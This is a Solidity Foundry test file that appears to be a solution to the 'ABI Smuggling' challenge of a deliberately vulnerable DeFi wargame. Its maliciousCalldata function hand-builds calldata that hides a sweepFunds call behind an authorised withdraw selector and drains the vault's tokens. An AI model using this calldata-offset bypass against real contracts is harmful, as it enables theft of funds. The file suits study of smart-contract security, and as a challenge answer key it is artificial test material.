// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console2.sol";

import {Utilities} from "../../utils/Utilities.sol";

import {SelfAuthorizedVault} from "../../../src/Contracts/abi-smuggling/SelfAuthorizedVault.sol";
import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

error CallerNotAllowed();

contract AbiSmugglingTest is Test {
    uint256 constant VAULT_TOKEN_BALANCE = 1_000_000e18;

    Utilities utils;
    SelfAuthorizedVault vault;
    DamnValuableToken dvt;

    address[] users;
    address deployer;
    address player;
    address recovery;

    function setUp() public {
        utils = new Utilities();
        users = utils.createUsers(3);
        deployer = users[0];
        player = users[1];
        recovery = users[2];

        vm.label(deployer, "Deployer");
        vm.label(player, "Player");
        vm.label(recovery, "Recovery");

        // Deploy token contract
        dvt = new DamnValuableToken();
        vm.label(address(dvt), "DVT");

        // Deploy vault
        vault = new SelfAuthorizedVault();
        vm.label(address(vault), "Vault");

        // Set permissions
        bytes32[] memory permissions = new bytes32[](2);
        // For deployer
        permissions[0] = vault.getActionId(
            0x85fb709d,
            deployer,
            address(vault)
        );
        // For player
        permissions[1] = vault.getActionId(0xd9caed12, player, address(vault));

        vault.setPermissions(permissions);

        assertTrue(vault.permissions(permissions[0]));
        assertTrue(vault.permissions(permissions[1]));

        // Make sure vault is initialized
        assertTrue(vault.initialized());

        // Deposit tokens into the vault
        dvt.transfer(address(vault), VAULT_TOKEN_BALANCE);

        assertEq(dvt.balanceOf(address(vault)), VAULT_TOKEN_BALANCE);
        assertEq(dvt.balanceOf(player), 0);

        // Cannot call vault directly
        vm.expectRevert(CallerNotAllowed.selector);
        vault.sweepFunds(deployer, address(dvt));

        vm.expectRevert(CallerNotAllowed.selector);
        vault.withdraw(address(dvt), player, VAULT_TOKEN_BALANCE);
    }

    function testExploit() public {
        console.log("Vault address: ", address(vault));
        console.log("DVT address: ", address(dvt));
        console.log("Recovery address: ", recovery);
        vm.startPrank(player);
        bytes memory data = maliciousCalldata();
        (bool success, ) = address(vault).call(data);
        require(success, "Call failed");
        vm.stopPrank();
        validation();
    }

    function validation() public {
        assertEq(dvt.balanceOf(address(vault)), 0);
        assertEq(dvt.balanceOf(player), 0);
        assertEq(dvt.balanceOf(recovery), VAULT_TOKEN_BALANCE);
    }

    function maliciousCalldata() public view returns (bytes memory) {
        bytes memory exDataSelector = abi.encodePacked(
            bytes4(keccak256("execute(address,bytes)"))
        ); // packed encoding without padding
        address vaultAddr = 0xF62849F9A0B5Bf2913b396098F7c7019b51A820a;
        // offset to the start of sweepFunds in uint (because uint is padded to the left)
        uint256 offset = 128;
        // append zero bytes for withdraw's selector to be at 100th byte position
        bytes32 zeroBytes = 0;
        bytes4 withdrawSelector = bytes4(
            keccak256("withdraw(address,address,uint256)")
        );
        // actual calldata size
        uint256 calldataSize = 68;
        bytes4 sweepFundsSelector = bytes4(
            keccak256("sweepFunds(address,address)")
        );

        // we must concatenate padded bytes to avoid unnecessary zeroes
        return
            bytes.concat(
                exDataSelector, // 0x1cff79cd
                abi.encode(
                    vaultAddr, // first parameter for execute() function
                    offset, // offset to sweepFundsSelector
                    zeroBytes, // appended bytes
                    withdrawSelector, // d9caed12
                    calldataSize // calldata starts here (calldata length)
                ),
                sweepFundsSelector, // 85fb709d
                abi.encode(recovery, address(dvt)) // parameters for sweepFunds()
            );
    }
}
